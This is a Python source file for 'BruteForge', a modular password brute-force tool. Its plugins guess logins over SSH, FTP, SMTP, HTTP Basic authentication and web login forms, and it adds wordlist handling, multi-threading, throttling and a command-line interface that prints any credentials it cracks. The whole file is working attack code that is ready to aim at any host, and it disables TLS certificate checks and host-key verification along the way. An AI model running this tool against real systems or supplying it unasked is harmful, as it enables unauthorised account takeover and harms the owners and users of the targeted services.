#!/usr/bin/env python3
"""
BruteForge — Modular brute-force framework.
Plugin-based architecture. Each protocol is a self-registering module.
"""

from abc import ABC, abstractmethod
import argparse
import concurrent.futures
import importlib
import inspect
import logging
import os
import pkgutil
import queue
import socket
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Generator, List, Optional, Tuple

from tqdm import tqdm


# ---------------------------------------------------------------------------
# Plugin base — abstract, no sugar
# ---------------------------------------------------------------------------

class BasePlugin(ABC):
    """Override authenticate() and detect(). That's it."""
    name: str = ""
    description: str = ""
    default_port: int = 0

    def __init__(self):
        self.logger = logging.getLogger(f"bf.{self.name}")

    @abstractmethod
    def authenticate(
        self, host: str, port: int, username: str, password: str, timeout: int = 10
    ) -> dict:
        ...

    @abstractmethod
    def detect(self, host: str, port: int, timeout: int = 5) -> bool:
        ...


# ---------------------------------------------------------------------------
# Plugin registry decorator / metaclass alternative
# ---------------------------------------------------------------------------

_registry: Dict[str, BasePlugin] = {}


def register(cls):
    """Class decorator to register a plugin."""
    if not issubclass(cls, BasePlugin):
        raise TypeError(f"{cls.__name__} must inherit BasePlugin")
    inst = cls()
    _registry[inst.name] = inst
    return cls


def get_plugin(name: str) -> BasePlugin:
    if name not in _registry:
        raise KeyError(f"Unknown plugin '{name}'. Available: {list(_registry.keys())}")
    return _registry[name]


def list_plugins() -> List[str]:
    return list(_registry.keys())


# ---------------------------------------------------------------------------
# Built-in plugins — defined here, not in plugins/ dir
# ---------------------------------------------------------------------------

@register
class SSHPlugin(BasePlugin):
    name = "ssh"
    description = "SSH brute-force via paramiko"
    default_port = 22

    def authenticate(self, host, port, username, password, timeout=10):
        import paramiko

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
                look_for_keys=False, allow_agent=False,
            )
            return {"success": True, "username": username, "password": password}
        except paramiko.AuthenticationException:
            return {"success": False, "username": username, "password": password}
        except (paramiko.SSHException, socket.timeout, OSError) as e:
            self.logger.debug(f"SSH error for {username}:{password} — {e}")
            return {"success": False, "error": str(e)}
        finally:
            client.close()

    def detect(self, host, port, timeout=5):
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            banner = s.recv(1024)
            s.close()
            return b"SSH" in banner
        except Exception:
            return False


@register
class FTPPlugin(BasePlugin):
    name = "ftp"
    description = "FTP brute-force via ftplib"
    default_port = 21

    def authenticate(self, host, port, username, password, timeout=10):
        from ftplib import FTP, error_perm, error_temp

        ftp = FTP()
        try:
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password)
            return {"success": True, "username": username, "password": password}
        except error_perm:
            return {"success": False, "username": username, "password": password}
        except (error_temp, socket.timeout, OSError) as e:
            self.logger.debug(f"FTP error: {e}")
            return {"success": False, "error": str(e)}
        finally:
            try:
                ftp.quit()
            except Exception:
                pass

    def detect(self, host, port, timeout=5):
        from ftplib import FTP
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.quit()
            return True
        except Exception:
            return False


@register
class SMTPPlugin(BasePlugin):
    name = "smtp"
    description = "SMTP AUTH brute-force"
    default_port = 25

    # TODO: TLS on 465 doesn't work here — need to detect and wrap SSL
    def authenticate(self, host, port, username, password, timeout=10):
        import smtplib

        try:
            server = smtplib.SMTP(host, port, timeout=timeout)
            server.ehlo_or_helo_if_needed()
            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo()
            server.login(username, password)
            return {"success": True, "username": username, "password": password}
        except smtplib.SMTPAuthenticationError:
            return {"success": False, "username": username, "password": password}
        except (smtplib.SMTPException, socket.timeout, OSError) as e:
            self.logger.debug(f"SMTP error: {e}")
            return {"success": False, "error": str(e)}
        finally:
            try:
                server.quit()
            except Exception:
                pass

    def detect(self, host, port, timeout=5):
        import smtplib
        try:
            server = smtplib.SMTP(host, port, timeout=timeout)
            code, _ = server.ehlo()
            server.quit()
            return code == 250
        except Exception:
            return False


@register
class HTTPBasicPlugin(BasePlugin):
    name = "http-basic"
    description = "HTTP Basic Authentication brute-force"
    default_port = 80

    def authenticate(self, host, port, username, password, timeout=10):
        import requests

        # FIXME: Only handles port in URL if non-standard
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{host}:{port}/" if port not in (80, 443) else f"{scheme}://{host}/"
        try:
            r = requests.get(
                url, auth=(username, password), timeout=timeout, verify=False,
                headers={"User-Agent": "BruteForge/1.0"},
            )
            if r.status_code == 200:
                return {"success": True, "username": username, "password": password, "status": r.status_code}
            return {"success": False, "username": username, "password": password, "status": r.status_code}
        except requests.RequestException as e:
            return {"success": False, "error": str(e)}

    def detect(self, host, port, timeout=5):
        import requests
        try:
            url = f"http://{host}:{port}/" if port != 80 else f"http://{host}/"
            r = requests.get(url, timeout=timeout, verify=False)
            return r.status_code in (401, 403)
        except Exception:
            return False


@register
class WebFormPlugin(BasePlugin):
    name = "web-form"
    description = "Web login form brute-force via POST"
    default_port = 80

    def __init__(self):
        super().__init__()
        self.username_field = "username"
        self.password_field = "password"
        self.failure_indicator = "incorrect"
        self.login_path = "/login"

    # FIXME: These should be configurable per-run instead of hardcoded
    def authenticate(self, host, port, username, password, timeout=10):
        import requests
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{host}:{port}{self.login_path}" if port not in (80, 443) else f"{scheme}://{host}{self.login_path}"
        try:
            r = requests.post(
                url,
                data={self.username_field: username, self.password_field: password},
                timeout=timeout, verify=False,
                headers={"User-Agent": "BruteForge/1.0"},
            )
            success = self.failure_indicator not in r.text.lower()
            return {"success": success, "username": username, "password": password, "status": r.status_code, "len": len(r.text)}
        except requests.RequestException as e:
            return {"success": False, "error": str(e)}

    def detect(self, host, port, timeout=5):
        import requests
        try:
            url = f"http://{host}:{port}{self.login_path}" if port != 80 else f"http://{host}{self.login_path}"
            r = requests.get(url, timeout=timeout, verify=False)
            return r.status_code == 200 and "password" in r.text.lower()
        except Exception:
            return False


# ---------------------------------------------------------------------------
# Wordlist manager — generator, don't load everything at once if we can help it
# ---------------------------------------------------------------------------

@dataclass
class WordlistManager:
    path: str

    def __post_init__(self):
        if not os.path.isfile(self.path):
            raise FileNotFoundError(f"Wordlist not found: {self.path}")

    def entries(self) -> Generator[str, None, None]:
        with open(self.path, "r", errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                yield line

    def count(self) -> int:
        """Naive line count. Slow on huge files but whatever."""
        n = 0
        with open(self.path, "r", errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    n += 1
        return n


# ---------------------------------------------------------------------------
# Throttle manager
# ---------------------------------------------------------------------------

@dataclass
class ThrottleManager:
    delay: float = 0.0
    _last_call: float = field(default_factory=time.time)
    # CWE-362: protect shared _last_call across threads
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def wait(self):
        if self.delay <= 0:
            return
        elapsed = time.time() - self._last_call
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        with self._lock:
            self._last_call = time.time()


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class BruteForceEngine:
    """Orchestrates plugins, wordlists, threading, and output."""

    def __init__(self, plugin_name: str, target: str, port: int = 0,
                 wordlist_path: str = "", timeout: int = 10,
                 threads: int = 4, delay: float = 0.0):
        self.plugin = get_plugin(plugin_name)
        self.host = target
        self.port = port or self.plugin.default_port
        self.timeout = timeout
        self.threads = threads
        self.wordlist = WordlistManager(wordlist_path) if wordlist_path else None
        self.throttle = ThrottleManager(delay)
        self.found = []
        self.logger = logging.getLogger("bf.engine")

    def _worker(self, username: str, password: str) -> Optional[dict]:
        self.throttle.wait()
        result = self.plugin.authenticate(self.host, self.port, username, password, self.timeout)
        if result.get("success"):
            self.logger.info(f"FOUND: {username}:{password}")
            return result
        return None

    def run(self, usernames: List[str], passwords: Optional[List[str]] = None) -> List[dict]:
        """Run brute-force with cartesian product of usernames × passwords."""
        if passwords is None and self.wordlist:
            passwords = list(self.wordlist.entries())
        elif passwords is None:
            raise ValueError("No passwords provided and no wordlist loaded")

        total = len(usernames) * len(passwords)
        self.logger.info(f"Starting {self.plugin.name} against {self.host}:{self.port} ({total} attempts)")

        results = []
        with tqdm(total=total, desc=f"{self.plugin.name}", unit="try") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {}
                for user in usernames:
                    for pw in passwords:
                        fut = ex.submit(self._worker, user, pw)
                        futures[fut] = (user, pw)

                for fut in concurrent.futures.as_completed(futures):
                    pbar.update(1)
                    try:
                        res = fut.result()
                        if res:
                            results.append(res)
                            pbar.set_postfix(found=len(results))
                    except Exception as e:
                        self.logger.debug(f"Worker failed: {e}")
        return results

    def detect_service(self) -> bool:
        return self.plugin.detect(self.host, self.port, self.timeout)


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(prog="bruteforge", description="Modular brute-force framework")
    p.add_argument("plugin", choices=list_plugins(), help="Target protocol")
    p.add_argument("-t", "--target", required=True, help="Target host")
    p.add_argument("-p", "--port", type=int, default=0, help="Port (default: per-plugin)")
    p.add_argument("-u", "--user", help="Single username")
    p.add_argument("-U", "--user-list", help="File of usernames")
    p.add_argument("-w", "--wordlist", required=True, help="Password wordlist")
    p.add_argument("--threads", type=int, default=4, help="Worker threads")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between attempts (sec)")
    p.add_argument("--timeout", type=int, default=10, help="Connection timeout")
    p.add_argument("--detect-only", action="store_true", help="Only probe for service")
    p.add_argument("-v", "--verbose", action="store_true", help="Debug logging")
    return p


def main():
    logging.basicConfig(
        level=logging.DEBUG if "-v" in sys.argv or "--verbose" in sys.argv else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    parser = build_parser()
    args = parser.parse_args()

    if args.detect_only:
        engine = BruteForceEngine(args.plugin, args.target, args.port, timeout=args.timeout)
        found = engine.detect_service()
        print(f"Service {'detected' if found else 'not detected'} on {args.target}:{engine.port}")
        return

    usernames = []
    if args.user:
        usernames = [args.user]
    elif args.user_list:
        with open(args.user_list) as f:
            usernames = [l.strip() for l in f if l.strip()]
    else:
        print("Provide --user or --user-list")
        sys.exit(1)

    engine = BruteForceEngine(
        args.plugin, args.target, args.port,
        wordlist_path=args.wordlist, timeout=args.timeout,
        threads=args.threads, delay=args.delay,
    )

    results = engine.run(usernames)
    if results:
        print(f"\n=== FOUND {len(results)} CREDENTIAL(S) ===")
        for r in results:
            print(f"{r['username']}:{r['password']}")
    else:
        print("\nNo valid credentials found.")


if __name__ == "__main__":
    main()
